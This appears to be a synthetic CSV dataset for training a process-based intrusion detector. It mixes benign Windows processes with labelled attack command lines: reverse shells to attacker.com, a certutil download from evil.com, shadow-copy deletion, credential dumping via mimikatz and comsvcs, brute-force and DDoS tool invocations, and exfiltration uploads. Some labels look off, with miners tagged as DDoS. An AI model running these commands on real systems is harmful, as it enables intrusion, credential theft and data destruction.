process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
wininit.exe,wininit.exe,26.548593808121097,2.341942826976645,0,6,0,normal,synthetic_normal,
services.exe,services.exe,3.9311875578329083,7.3435955829141,0,12,0,normal,synthetic_normal,
Spotify.exe,Spotify.exe,3.9303223770710916,4.465626235734401,1,11,0,normal,synthetic_normal,
OBS64.exe,OBS64.exe,5.751727819212437,0.6641882207600822,0,14,0,normal,synthetic_normal,
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh,62.627801179144456,10.486769388794979,1,199,0,brute_force,brute_force_tools,
wslhost.exe,wslhost.exe,6.973634509570973,7.840978713813493,1,14,0,normal,synthetic_normal,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,78.31619132996916,12.496663984167682,1,384,0,brute_force,brute_force_tools,
blackmatter.exe,blackmatter.exe --silent,56.53049817857653,34.40818738845264,1,26,0,malware,known_malware,
Dropbox.exe,Dropbox.exe,16.50950683971233,2.3211828261782568,0,8,0,normal,synthetic_normal,
psexec.exe,psexec.exe \\192.168.1.1 -u admin -p pass cmd,63.30801512318293,17.255280583162858,1,0,0,lateral_movement,mitre_lateral_movement,critical
ShellExperienceHost.exe,ShellExperienceHost.exe,14.401062567388287,0.5097250380579006,0,19,0,normal,synthetic_normal,
megasync.exe,megasync.exe --upload C:\SensitiveData,48.61772514188044,21.405676834983197,1,5,0,data_exfiltration,mitre_data_exfiltration,high
tsc.exe,tsc.exe,0.8363519423325616,4.501319054179509,0,16,0,normal,synthetic_normal,
powercat.ps1,powershell.exe powercat -c attacker.com -p 4444 -e cmd,53.25059010591526,14.27181691799368,1,0,0,trojan,mitre_command_control,critical
7z.exe,7z.exe a -ppassword archive.7z C:\Confidential,51.8013007377118,24.34527627912535,1,3,0,data_exfiltration,mitre_data_exfiltration,medium
vssadmin.exe,vssadmin.exe delete shadows /all /quiet,37.57988088440058,5.6769012612906256,0,0,0,ransomware,mitre_ransomware,critical
oracle.exe,oracle.exe,25.691359298055243,4.430620983733549,1,11,0,normal,synthetic_normal,
yarn.exe,yarn.exe,8.671785719134496,7.456576977988947,0,12,0,normal,synthetic_normal,
comsvcs.dll,rundll32.exe comsvcs.dll MiniDump,33.109390905161284,17.340882682821704,1,4,0,credential_dumping,mitre_credential_dumping,critical
xmrig.exe,xmrig.exe --silent,74.8843249502645,29.401032803502705,1,16,0,ddos,known_malware,
Everything.exe,Everything.exe,5.136925408593389,5.0910547537745865,0,8,0,normal,synthetic_normal,
javaw.exe,javaw.exe,6.393134174192049,4.994676053565057,0,12,0,normal,synthetic_normal,
ntdsutil.exe,"ntdsutil.exe ""ac i ntds"" ifm",68.08509011673529,10.910764885549415,0,9,0,credential_dumping,mitre_credential_dumping,critical
rubeus.exe,rubeus.exe asreproast,45.55047029708123,14.704137603374683,1,6,0,reconnaissance,mitre_reconnaissance,critical
firefox.exe,firefox.exe,40.52521047101289,4.447933365547618,0,13,0,normal,synthetic_normal,
sharphound.ps1,powershell.exe -ep bypass Invoke-BloodHound,69.76226174360804,21.27435761734213,0,8,0,reconnaissance,mitre_reconnaissance,critical
slowloris.py,python slowloris.py target.com,92.3727776760411,11.672082644515081,1,603,0,ddos,ddos_tools,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,45.70782196037571,13.103217986753368,1,478,0,brute_force,brute_force_tools,
SearchUI.exe,SearchUI.exe,6.480464295758742,2.966953020528048,0,12,0,normal,synthetic_normal,
EXCEL.EXE,EXCEL.EXE,24.947221384969527,6.4997997619413095,1,2,0,normal,synthetic_normal,
obs64.exe,obs64.exe,26.126420845059467,5.983980550702666,0,8,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,94.32169134722112,39.67987707585864,1,235,0,ddos,ddos_tools,
wininit.exe,wininit.exe,19.826512643034924,7.610033948759427,0,0,0,normal,synthetic_normal,
njrat.exe,njrat.exe --silent,74.38768538990954,22.41673518786402,1,15,0,trojan,known_malware,
javaws.exe,javaws.exe,19.250729427562895,1.873016229155986,0,15,0,normal,synthetic_normal,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,85.79748465169064,14.167125357088297,1,355,0,brute_force,brute_force_tools,
obs64.exe,obs64.exe,2.9562813690956435,3.67294977223869,0,7,0,normal,synthetic_normal,
rustup.exe,rustup.exe,5.448214145933932,2.5957229879760857,0,13,0,normal,synthetic_normal,
rider64.exe,rider64.exe,7.297864658397424,4.716270226221787,0,5,0,normal,synthetic_normal,
vite.exe,vite.exe,11.26783336725273,3.3609226806559382,0,14,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",93.62757671296058,9.065959920831627,1,455,0,brute_force,brute_force_tools,
MsSense.exe,MsSense.exe,25.646001115258457,3.454638509713075,0,19,0,normal,synthetic_normal,
ethminer.exe,ethminer.exe --silent,67.82555525494772,14.31952310997028,1,26,0,ddos,known_malware,
loic.exe,loic.exe --target 192.168.1.1 --port 80,90.55170564419306,24.56629614517346,1,937,0,ddos,ddos_tools,
ShellExperienceHost.exe,ShellExperienceHost.exe,9.864037784211137,1.0719498425738088,0,15,0,normal,synthetic_normal,
OneDrive.exe,OneDrive.exe,25.248533011629714,4.387525121945228,0,7,0,normal,synthetic_normal,
Spotify.exe,Spotify.exe,12.438262403394452,2.1839564447742186,0,0,0,normal,synthetic_normal,
mshta.exe,mshta.exe vbscript:Execute,22.618995873081644,18.74558346727273,0,4,0,malware,mitre_malicious_scripts,high
Premiere.exe,Premiere.exe,23.399245420987054,5.633453909464606,0,13,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,93.07738723101858,10.070640541785718,1,1723,0,ddos,ddos_tools,
wslhost.exe,wslhost.exe,11.767738588587246,2.8322794172161294,1,2,0,normal,synthetic_normal,
masscan.exe,masscan.exe -p1-65535 192.168.1.0/24,22.059735585586935,12.741035125624126,0,33,0,reconnaissance,mitre_network_scanning,medium
MSBuild.exe,MSBuild.exe,0.9939439112459647,2.766931764571932,0,10,0,normal,synthetic_normal,
dotnet.exe,dotnet.exe,8.071220621456524,5.979381420271702,1,17,0,normal,synthetic_normal,
vssadmin.exe,vssadmin.exe delete shadows /all /quiet,20.311640524981346,16.578289870558173,1,10,0,ransomware,mitre_ransomware,critical
ctfmon.exe,ctfmon.exe,20.818686348772044,4.092928998496162,0,10,0,normal,synthetic_normal,
gpg-agent.exe,gpg-agent.exe,8.269459852145655,1.419700393436167,1,19,0,normal,synthetic_normal,
OBS64.exe,OBS64.exe,25.44986439383745,0.8693386277247251,1,1,0,normal,synthetic_normal,
SecurityHealthSystray.exe,SecurityHealthSystray.exe,23.279668120734236,6.572893785908768,0,4,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,4.804087423626159,4.636733382003626,0,15,0,normal,synthetic_normal,
nmap.exe,nmap.exe -p- --min-rate 1000,60.09298721243781,6.587684387242163,0,20,0,reconnaissance,mitre_network_scanning,medium
hoic.exe,hoic.exe,94.15397563607323,17.729116446027,1,1877,0,ddos,ddos_tools,
msedge.exe,msedge.exe,28.325997652305855,20.054263585609004,0,0,0,normal,synthetic_normal,
com.docker.service.exe,com.docker.service.exe,23.68203407247378,3.325899601222183,0,16,0,normal,synthetic_normal,
SgrmBroker.exe,SgrmBroker.exe,22.110681450141392,4.490563103326898,0,15,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,28.040759201218606,7.762502623740109,0,15,0,normal,synthetic_normal,
java.exe,java.exe,13.644988830531213,3.362728123389367,0,0,0,normal,synthetic_normal,
postgres.exe,postgres.exe,5.034321001364348,1.1172926040319084,1,17,0,normal,synthetic_normal,
taskhosts.exe,taskhosts.exe --silent,56.01960024512611,32.43686596389722,1,16,0,malware,known_malware,
SenseIR.exe,SenseIR.exe,2.9371820392007466,7.7541293634200485,1,10,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,51.995213547962386,7.462319528372525,0,5,0,normal,synthetic_normal,
brave.exe,brave.exe,29.98565867871103,5.857291177757033,1,4,0,normal,synthetic_normal,
services.exe,services.exe,14.684425072614282,7.6779438820298065,1,3,0,normal,synthetic_normal,
MsSense.exe,MsSense.exe,14.61969389672251,2.315259464707391,0,11,0,normal,synthetic_normal,
OUTLOOK.EXE,OUTLOOK.EXE,1.3848823644456465,2.674386370476147,1,12,0,normal,synthetic_normal,
python3.11.exe,python3.11.exe,0.2212085791324514,4.280430448191343,0,1,0,normal,synthetic_normal,
wbadmin.exe,wbadmin.exe delete catalog -quiet,31.58657433968181,15.786951812929956,0,6,0,ransomware,mitre_ransomware,critical
cpuminer.exe,cpuminer.exe --silent,58.628223102605716,36.839385314582074,1,24,0,ddos,known_malware,
python.exe,python.exe,80.46636141627647,23.05337284144373,1,16,0,normal,synthetic_normal,
minerd.exe,minerd.exe --silent,34.40637045226397,38.83793150541557,1,20,0,ddos,known_malware,
alphv.exe,alphv.exe --silent,39.206889492245686,25.003806764511296,1,3,0,malware,known_malware,
OneDrive.exe,OneDrive.exe,11.862317720288814,2.869564219295844,0,13,0,normal,synthetic_normal,
com.docker.service.exe,com.docker.service.exe,12.679191197035276,6.803735903086411,0,18,0,normal,synthetic_normal,
ssh-agent.exe,ssh-agent.exe,24.268713705937543,7.918658173024106,0,14,0,normal,synthetic_normal,
iCloudServices.exe,iCloudServices.exe,4.779156708815311,2.1550463255994705,0,4,0,normal,synthetic_normal,
Teams.exe,Teams.exe,12.06671040850418,6.8589988260456645,0,0,0,normal,synthetic_normal,
fish.exe,fish.exe,26.14824419420944,5.298570210381418,1,7,0,normal,synthetic_normal,
comsvcs.dll,rundll32.exe comsvcs.dll MiniDump,51.491866326589886,10.500214758935904,1,2,0,credential_dumping,mitre_credential_dumping,critical
Illustrator.exe,Illustrator.exe,3.927443882696683,0.6222883447965237,0,2,0,normal,synthetic_normal,
sh.exe,sh.exe,12.458099420829226,6.673627115937218,1,5,0,normal,synthetic_normal,
dridex.exe,dridex.exe --silent,64.06660580812044,16.706185052954957,1,4,0,malware,known_malware,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,70.00370925330864,14.686817489023053,1,211,0,brute_force,brute_force_tools,
spoolsv.exe,spoolsv.exe,23.229122673824545,6.151171788880231,0,14,0,normal,synthetic_normal,
ZoomIt.exe,ZoomIt.exe,9.910104079137609,6.001151697454508,0,3,0,normal,synthetic_normal,
WmiPrvSE.exe,WmiPrvSE.exe,13.497911582915181,1.431003382336898,1,4,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,53.40752253330259,6.670133749371432,1,131,0,brute_force,brute_force_tools,
firefox.exe,firefox.exe,8.416810411088397,12.582498115219037,0,18,0,normal,synthetic_normal,
wscript.exe,wscript.exe //E:vbscript malware.txt,69.47650914723039,9.199658096433566,1,4,0,malware,mitre_malicious_scripts,medium
wannacry.exe,wannacry.exe --silent,81.08434757773016,25.09713158009266,1,1,0,malware,known_malware,
System,System,0.9351882253398947,0.3524640031963291,0,13,1,normal,synthetic_normal,
mongod.exe,mongod.exe,16.113564740200825,5.409032319442749,0,10,0,normal,synthetic_normal,
Everything.exe,Everything.exe,12.709727883826405,0.7507041688381151,0,7,0,normal,synthetic_normal,
conhost.exe,conhost.exe,8.732381059937083,3.515940220173337,1,7,0,normal,synthetic_normal,
hoic.exe,hoic.exe,90.325372534514,16.5412568206143,1,241,0,ddos,ddos_tools,
ncat.exe,ncat.exe --exec cmd.exe --allow attacker.com -l 4444,31.827328809203827,11.205998252763234,1,4,0,trojan,mitre_command_control,critical
npm.exe,npm.exe,12.229189090543652,3.9598422525090915,0,1,0,normal,synthetic_normal,
yarn.exe,yarn.exe,6.456817286411556,4.710616618674953,1,10,0,normal,synthetic_normal,
Photoshop.exe,Photoshop.exe,4.0452853695756605,7.2784333673311945,1,18,0,normal,synthetic_normal,
iexplore.exe,iexplore.exe,20.218371223234673,4.163271021480373,0,18,0,normal,synthetic_normal,
pythonw.exe,pythonw.exe,23.75150325635647,3.488496929401267,0,11,0,normal,synthetic_normal,
fish.exe,fish.exe,8.521870464614786,2.449672276516032,0,19,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,89.38588512488049,37.350615762325376,1,922,0,ddos,ddos_tools,
postgres.exe,postgres.exe,24.629839610219573,7.0573283979490276,0,8,0,normal,synthetic_normal,
npm.exe,npm.exe,28.485774928724506,2.9246435076622963,0,14,0,normal,synthetic_normal,
chrome.exe,chrome.exe,0.8583543095639046,6.6878132065225415,0,2,0,normal,synthetic_normal,
goland64.exe,goland64.exe,6.085308930747403,0.6137063358629073,0,16,0,normal,synthetic_normal,
wsl.exe,wsl.exe,4.0902569558238575,3.782236951939045,1,16,0,normal,synthetic_normal,
wmiexec.py,python wmiexec.py admin:pass@target,57.60129316551578,12.681727691346094,1,0,0,lateral_movement,mitre_lateral_movement,critical
System Idle Process,System Idle Process,93.09882107146224,0.1473340107529424,0,9,1,normal,synthetic_normal,
wsl.exe,wsl.exe,22.10821871755213,0.7715650828501683,1,0,0,normal,synthetic_normal,
procexp64.exe,procexp64.exe,23.071340383693617,2.6947578147161755,1,3,0,normal,synthetic_normal,
SearchUI.exe,SearchUI.exe,10.93305697435807,1.5735008968533208,0,1,0,normal,synthetic_normal,
powercat.ps1,powershell.exe powercat -c attacker.com -p 4444 -e cmd,35.91702953735128,5.903835017776209,1,3,0,trojan,mitre_command_control,critical
Teams.exe,Teams.exe,1.300081636263899,7.481953828501568,0,5,0,normal,synthetic_normal,
javaw.exe,javaw.exe,0.4937752924500882,3.4851356325993486,1,17,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,73.80536766115657,2.713712442735866,0,11,0,normal,synthetic_normal,
vlc.exe,vlc.exe,25.09488266196293,3.4561763841660174,0,0,0,normal,synthetic_normal,
Autoruns64.exe,Autoruns64.exe,17.348164895687226,6.1223072217922185,1,17,0,normal,synthetic_normal,
webpack.exe,webpack.exe,19.347586927384796,1.619877114658792,0,5,0,normal,synthetic_normal,
agent_tesla.exe,agent_tesla.exe --silent,34.04676563703342,22.53173269504174,1,18,0,malware,known_malware,
rollup.exe,rollup.exe,4.990050656913773,1.8380491094985385,0,1,0,normal,synthetic_normal,
webpack.exe,webpack.exe,7.872177764549873,7.846983590164379,0,16,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,85.27612981322076,23.257303357989265,1,417,0,ddos,ddos_tools,
wslservice.exe,wslservice.exe,5.592838805590313,5.529401951139211,0,5,0,normal,synthetic_normal,
linpeas.sh,bash linpeas.sh,28.544414903919424,9.348104725782536,1,8,0,privilege_escalation,mitre_privilege_escalation,high
mimikatz.exe,mimikatz.exe lsadump::sam,66.2542493400428,8.75007569636827,0,10,0,credential_dumping,mitre_credential_dumping,critical
megasync.exe,megasync.exe --upload C:\SensitiveData,34.312701930556926,21.652581567925488,1,2,0,data_exfiltration,mitre_data_exfiltration,high
SenseIR.exe,SenseIR.exe,0.6431504981422442,4.416522617952126,0,19,0,normal,synthetic_normal,
Memory Compression,Memory Compression,15.493996382632806,3.200503535455595,0,17,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,88.62825909555289,18.417716008665394,1,102,0,ddos,ddos_tools,
svchost32.exe,svchost32.exe --silent,34.93516927119635,21.659360043383316,1,12,0,malware,known_malware,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,62.92940165586273,19.347848678084773,1,480,0,brute_force,brute_force_tools,
MsMpEng.exe,MsMpEng.exe,70.90807632065365,2.3119837677290302,1,1,0,normal,synthetic_normal,
explorar.exe,explorar.exe --silent,43.208731730481226,10.107939784904435,1,28,0,malware,known_malware,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,71.98750091036943,7.7917460881145635,1,134,0,brute_force,brute_force_tools,
WindowsTerminal.exe,WindowsTerminal.exe,17.033055286889898,1.0460444274499945,0,3,0,normal,synthetic_normal,
nc.exe,nc.exe -e cmd.exe attacker.com 4444,69.54353389485314,5.536556293251955,1,6,0,trojan,mitre_command_control,critical
git.exe,git.exe,4.906808798496845,5.143382172906481,0,12,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,82.4290044911577,37.145584107915994,1,237,0,ddos,ddos_tools,
slowloris.py,python slowloris.py target.com,89.99029849746029,34.648091834610526,1,136,0,ddos,ddos_tools,
WmiPrvSE.exe,WmiPrvSE.exe,18.15394471574168,6.2837501104609625,0,11,0,normal,synthetic_normal,
make.exe,make.exe,28.60457104164171,7.991942521807176,0,10,0,normal,synthetic_normal,
goland64.exe,goland64.exe,2.335023104497671,7.7632098382624966,0,19,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,2.1824230324340954,3.259363993160972,0,6,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,84.66317818433431,19.081949700454025,1,829,0,ddos,ddos_tools,
node.exe,node.exe,67.37817902818031,22.57233316991921,0,7,0,normal,synthetic_normal,
rubeus.exe,rubeus.exe kerberoast,79.05516044058005,24.786340267942247,0,2,0,reconnaissance,mitre_reconnaissance,critical
python.exe,python.exe,39.620334932362,32.406657219035814,0,8,0,normal,synthetic_normal,
opera.exe,opera.exe,1.3382919201242294,2.7154910756845267,0,15,0,normal,synthetic_normal,
gpg.exe,gpg.exe,26.294230348751842,3.504759649147976,1,11,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,52.83089687272687,5.60779514068238,1,296,0,brute_force,brute_force_tools,
oracle.exe,oracle.exe,21.936348916299234,1.66574268494972,1,9,0,normal,synthetic_normal,
GoogleDriveSync.exe,GoogleDriveSync.exe,14.402226551657977,2.3297927380741563,0,10,0,normal,synthetic_normal,
cssrs.exe,cssrs.exe --silent,55.79081464231541,14.096732783388283,1,8,0,malware,known_malware,
pycharm64.exe,pycharm64.exe,18.56484378863367,6.815870005389125,1,4,0,normal,synthetic_normal,
psexec64.exe,psexec64.exe -accepteula \\target,24.048428965650707,21.713475759736617,1,0,0,lateral_movement,mitre_lateral_movement,high
tcpview.exe,tcpview.exe,16.032486943493854,5.582180227278984,0,15,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,99.56474175697312,16.284802817945135,1,72,0,brute_force,brute_force_tools,
SyncThing.exe,SyncThing.exe,20.784306922985934,1.5106481016993853,0,0,0,normal,synthetic_normal,
iexplore.exe,iexplore.exe,21.392307631672942,6.5821369529399805,0,0,0,normal,synthetic_normal,
MSACCESS.EXE,MSACCESS.EXE,20.62154282264692,3.388661486382846,0,13,0,normal,synthetic_normal,
dockerd.exe,dockerd.exe,1.5116787631839523,4.358706009301763,1,18,0,normal,synthetic_normal,
nmap.exe,nmap.exe -sV -sC 192.168.1.0/24,43.037924074759815,23.791429189946356,0,35,0,reconnaissance,mitre_network_scanning,medium
chromium.exe,chromium.exe,17.57303126431588,0.6058922628665354,0,4,0,normal,synthetic_normal,
Discord.exe,Discord.exe,17.642908506456635,2.4988305419576156,0,20,0,normal,synthetic_normal,
cmd.exe,cmd.exe /c powershell -encodedcommand,63.73866119254306,9.175875336802823,1,4,0,malware,mitre_malicious_scripts,high
smss.exe,smss.exe,8.339563239587731,7.282268104526825,0,14,0,normal,synthetic_normal,
vssadmin.exe,vssadmin.exe delete shadows /all /quiet,28.969630412305683,11.029513479033833,1,4,0,ransomware,mitre_ransomware,critical
powershell.exe,powershell.exe,4.342622714619591,3.87215970586644,1,2,0,normal,synthetic_normal,
ssh-agent.exe,ssh-agent.exe,14.601651755203843,1.0747993172260113,0,8,0,normal,synthetic_normal,
com.docker.service.exe,com.docker.service.exe,22.651917838649286,6.412506164977354,0,18,0,normal,synthetic_normal,
wslhost.exe,wslhost.exe,4.227573959434418,3.6416759727965564,1,3,0,normal,synthetic_normal,
Discord.exe,Discord.exe,6.358029426000359,7.049321740176735,0,9,0,normal,synthetic_normal,
Dropbox.exe,Dropbox.exe,13.977191970655925,7.9016160023435855,1,18,0,normal,synthetic_normal,
npx.exe,npx.exe,4.503973497722537,1.91523759960078,1,12,0,normal,synthetic_normal,
csrs.exe,csrs.exe --silent,64.34201590117443,36.93378542312448,1,21,0,trojan,known_malware,
MSBuild.exe,MSBuild.exe,72.71754899753336,5.961811381751484,0,17,0,normal,synthetic_normal,
bfgminer.exe,bfgminer.exe --silent,74.95357360852461,20.49527814810883,1,11,0,ddos,known_malware,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,70.7586863008419,16.8377518786849,1,229,0,brute_force,brute_force_tools,
csc.exe,csc.exe,29.071144188599234,4.858680938855981,0,7,0,normal,synthetic_normal,
rustup.exe,rustup.exe,6.903806144847478,3.8944384648357424,0,16,0,normal,synthetic_normal,
Premiere.exe,Premiere.exe,6.680318305161869,3.099576373138914,0,5,0,normal,synthetic_normal,
lsass.exe,lsass.exe,16.675038216996725,4.63735781708017,1,9,0,normal,synthetic_normal,
cmd.exe,cmd.exe,22.07634614301803,3.4939465406454584,0,16,0,normal,synthetic_normal,
7zG.exe,7zG.exe,29.838511180072242,4.024663192029578,0,6,0,normal,synthetic_normal,
hoic.exe,hoic.exe,89.20599738493351,23.181023924464185,1,604,0,ddos,ddos_tools,
fontdrvhost.exe,fontdrvhost.exe,15.735837323336765,0.5159001352160609,1,8,0,normal,synthetic_normal,
Dropbox.exe,Dropbox.exe,8.47089472280725,3.0597437839013844,0,3,0,normal,synthetic_normal,
msiexec.exe,msiexec.exe,28.07890975383124,4.131455066053153,1,19,0,normal,synthetic_normal,
tcpview.exe,tcpview.exe,6.558166879445507,3.0572996605661897,1,4,0,normal,synthetic_normal,
fontdrvhost.exe,fontdrvhost.exe,17.277788168799212,0.587675328295961,1,17,0,normal,synthetic_normal,
hoic.exe,hoic.exe,85.65509377465936,16.10366680236594,1,852,0,ddos,ddos_tools,
mimikatz.exe,mimikatz.exe lsadump::sam,24.708250828599052,6.722753707816594,0,9,0,credential_dumping,mitre_credential_dumping,critical
wannacry.exe,wannacry.exe --silent,63.0769900900004,24.462506366412093,1,12,0,malware,known_malware,
hoic.exe,hoic.exe,88.25089162790883,11.120023093239231,1,850,0,ddos,ddos_tools,
iexplore.exe,iexplore.exe,14.859966207630217,3.1654407573447596,0,17,0,normal,synthetic_normal,
lockbit.exe,lockbit.exe --silent,46.04379046085926,12.70701112067483,1,14,0,ransomware,known_malware,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",98.92645813908916,14.149397588928684,1,226,0,brute_force,brute_force_tools,
msedge.exe,msedge.exe,38.98647300955543,12.975720876141153,0,20,0,normal,synthetic_normal,
conhost.exe,conhost.exe,10.624452222559235,0.893714043697273,1,11,0,normal,synthetic_normal,
code.exe,code.exe,1.0849845652254586,4.288359893791109,1,8,0,normal,synthetic_normal,
npx.exe,npx.exe,20.801454943585227,2.253209036837119,0,10,0,normal,synthetic_normal,
ProcessHacker.exe,ProcessHacker.exe,3.6806130246337068,0.7051427089381366,0,0,0,normal,synthetic_normal,
printspoofer.exe,printspoofer.exe -i -c cmd,38.46977554581673,15.90448925266238,1,3,0,privilege_escalation,mitre_privilege_escalation,critical
smartscreen.exe,smartscreen.exe,20.510110663067866,4.204286851073139,1,7,0,normal,synthetic_normal,
nmap.exe,nmap.exe -sV -sC 192.168.1.0/24,61.56051802060403,23.592535437054828,0,17,0,reconnaissance,mitre_network_scanning,medium
mpc-hc64.exe,mpc-hc64.exe,21.355717454194618,6.441342299387168,0,13,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,88.4081817665048,31.20462992320605,1,402,0,ddos,ddos_tools,
vlc.exe,vlc.exe,28.360186592606688,6.972630566511442,0,17,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,0.8883545389126368,5.245116299849741,0,3,0,normal,synthetic_normal,
iexplore.exe,iexplore.exe,14.149740484232012,3.3142982230634415,0,8,0,normal,synthetic_normal,
go.exe,go.exe,27.06698559690827,2.08306628854686,0,6,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,70.97592413829844,13.036838168710263,1,466,0,brute_force,brute_force_tools,
dasHost.exe,dasHost.exe,4.927150554671307,6.576266364371439,0,19,0,normal,synthetic_normal,
atom.exe,atom.exe,3.3774525643625997,4.872395146898748,0,8,0,normal,synthetic_normal,
wslg.exe,wslg.exe,20.25685190507661,1.170508581080508,0,13,0,normal,synthetic_normal,
winPEASx64.exe,winPEASx64.exe quiet,72.38550122368183,14.7853879964909,1,0,0,privilege_escalation,mitre_privilege_escalation,high
lync.exe,lync.exe,24.55705696906517,2.364711774577414,1,1,0,normal,synthetic_normal,
oracle.exe,oracle.exe,22.389752016754727,2.7096019733145016,0,11,0,normal,synthetic_normal,
sqlservr.exe,sqlservr.exe,14.913472540494993,1.4273435440117677,0,20,0,normal,synthetic_normal,
oracle.exe,oracle.exe,6.16174354673123,5.672824539149241,1,19,0,normal,synthetic_normal,
OBS64.exe,OBS64.exe,5.7019012512912015,3.2572862519602,0,20,0,normal,synthetic_normal,
TrustedInstaller.exe,TrustedInstaller.exe,14.3198175542095,2.6602235314212184,0,6,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,84.86558892546849,27.279983195300368,1,950,0,ddos,ddos_tools,
stress.exe,stress.exe --cpu 8 --io 4,85.43920713179773,37.84481463918778,1,1132,0,ddos,ddos_tools,
opera.exe,opera.exe,22.807813099814098,0.7178275333071839,0,0,0,normal,synthetic_normal,
RuntimeBroker.exe,RuntimeBroker.exe,5.305870790768981,7.349135457902649,0,5,0,normal,synthetic_normal,
procexp.exe,procexp.exe,20.415792783717386,6.630264771817819,0,4,0,normal,synthetic_normal,
explorer.exe,explorer.exe,17.144079350411133,4.277574788040159,0,9,0,normal,synthetic_normal,
python3.12.exe,python3.12.exe,16.611116762149834,3.9579579360346706,1,18,0,normal,synthetic_normal,
ninja.exe,ninja.exe,19.954611770483766,6.883661284219114,0,4,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,1.4156033540904378,4.044571016675685,0,6,0,normal,synthetic_normal,
Code.exe,Code.exe,7.670084356349291,1.9659888466767876,0,14,0,normal,synthetic_normal,
minerd.exe,minerd.exe --silent,42.532340389563785,35.23649115453158,1,27,0,ddos,known_malware,
ssh-agent.exe,ssh-agent.exe,26.563044966654907,7.725446628352166,0,2,0,normal,synthetic_normal,
svchosts.exe,svchosts.exe --silent,46.60828478827359,35.67687077293458,1,20,0,trojan,known_malware,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,77.36820654363487,10.544467145248886,1,447,0,brute_force,brute_force_tools,
rollup.exe,rollup.exe,22.79549681357929,3.95832467940887,0,6,0,normal,synthetic_normal,
sweetpotato.exe,sweetpotato.exe -p cmd.exe,68.83953025273593,8.451042870747695,1,5,0,privilege_escalation,mitre_privilege_escalation,critical
EXCEL.EXE,EXCEL.EXE,8.990410758546346,5.838181733263863,0,10,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,59.19488577639639,17.075244724134578,1,288,0,brute_force,brute_force_tools,
cmd.exe,cmd.exe,4.534553673461722,0.6276870689133167,1,6,0,normal,synthetic_normal,
dotnet.exe,dotnet.exe,1.5412954693704506,2.0372997203471543,0,19,0,normal,synthetic_normal,
certutil.exe,certutil.exe -urlcache -split -f http://evil.com/malware.exe,24.652321587081932,9.341480586066508,0,8,0,malware,mitre_download_execute,high
psexec.exe,psexec.exe \\target -s cmd.exe,79.43098948931143,18.81497833817814,1,3,0,lateral_movement,mitre_lateral_movement,high
